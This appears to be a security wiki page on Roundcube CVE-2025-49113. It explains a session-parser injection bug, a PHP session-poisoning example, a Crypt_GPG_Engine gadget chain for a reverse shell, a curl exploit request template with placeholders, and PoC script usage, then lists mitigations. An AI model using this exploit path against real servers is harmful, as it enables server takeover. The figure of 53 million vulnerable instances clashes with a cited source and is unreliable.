# PHP Session Parser Injection - Roundcube CVE-2025-49113

{{#include ../../banners/hacktricks-training.md}}

## Overview & Impact

Roundcube Webmail versions **1.1.0** through **1.6.10** are affected by **CVE-2025-49113**, a critical (CVSS 9.9) post-authentication remote code execution vulnerability. An authenticated user — whose credentials can be obtained via CSRF, log scraping, or brute force — can achieve full server takeover. Over 53 million instances remain vulnerable, including deployments in cPanel, Plesk, ISPConfig, and DirectAdmin. Immediate upgrade to **Roundcube ≥ 1.6.11** or **1.5.10** is essential.

## Root Cause

The flaw resides in `program/actions/settings/upload.php`, where the GET parameter `_from` is used directly as the session-variable name. Roundcube’s custom session handler (`rcube_session::unserialize()`) contains a logic error: when a session key begins with `!`, the parser skips parsing the value but only increments the read pointer by two characters, misaligning subsequent reads and allowing injection of `|` delimiters into the serialized stream.

## PHP Session Format & Parser Bug

With `serialize_handler='php'`, PHP session data is stored as consecutive `name|serialized_value` entries. The Roundcube parser loops until it finds `|`, extracts the variable name, and appends `s:length:"name";` to a growing serialized string. If a name starts with `!`, the parser skips over the value but only advances the pointer by two characters, corrupting the session structure:

```text
# Normal session entries
firstName|s:4:"John";lastName|s:3:"Doe";

# Corrupted when name starts with '!'
!firstName|s:11:"|s:3:\"pwn\";";lastName|s:3:"doe";
```

This misalignment injects an extra serialized object entry when Roundcube decodes and re-writes the session.

## Session Injection Example

```php
<?php
session_start();
// Poison session with a fake key starting with '!'
$_SESSION['!firstName'] = '|s:3:"pwn";';
$_SESSION['lastName']    = 'doe';

/* Serialized result stored by PHP:
   !firstName|s:11:"|s:3:\"pwn\";";
   lastName|s:3:"doe";
*/
?>
```

## Gadget Chain for RCE

A suitable gadget exists in PEAR’s `Crypt_GPG_Engine`. Its `__destruct()` method invokes `proc_open()` on the `$_gpgconf` property in `_closeIdleAgents()`. By serializing a `Crypt_GPG_Engine` object with a malicious `_gpgconf` string (e.g., a base64-encoded bash reverse shell), the destructor executes arbitrary commands during session cleanup.

## Exploit Steps (PoC)

1. Authenticate to Roundcube; obtain the `roundcube_sessid` cookie and CSRF token.
2. Craft a malicious session-poisoning upload request:
   ```bash
   curl 'https://target/roundcube/?_task=settings&_action=upload&_from=edit-!<serialized_object>' \
     -F '_file=@avatar.png;filename="|<base64_payload>;"' \
     -b 'roundcube_sessid=…' \
     -H 'X-CSRF-Token: …'
   ```
3. The `_from` injection corrupts the session parser; the `filename` injects the serialized gadget.
4. When PHP writes and later destroys the session, the `Crypt_GPG_Engine` gadget’s destructor executes, achieving RCE.

A complete PHP exploit script (`CVE-2025-49113.php`) automates login, session poisoning, and payload injection:
```bash
php CVE-2025-49113.php <url> <user> <pass> <cmd>
```

## Mitigation

- Upgrade Roundcube to **≥ 1.6.11** or **≥ 1.5.10** immediately.
- Deploy WAF rules to detect `_from` parameters containing `!` or serialized objects.
- Monitor for anomalous session files on disk.
- Rate-limit authentication endpoints to prevent brute force.

## References

- https://fearsoff.org/research/roundcube
- https://hakaisecurity.io/behind-the-bug-logic-error-in-roundcube-session-parser-cve-2025-49113/
- https://www.bleepingcomputer.com/news/security/over-84-000-roundcube-instances-vulnerable-to-actively-exploited-flaw/
- https://www.cyber.gc.ca/en/alerts-advisories/vulnerability-impacting-roundcube-webmail-cve-2025-49113
- https://digital.nhs.uk/cyber-alerts/2025/cc-4663
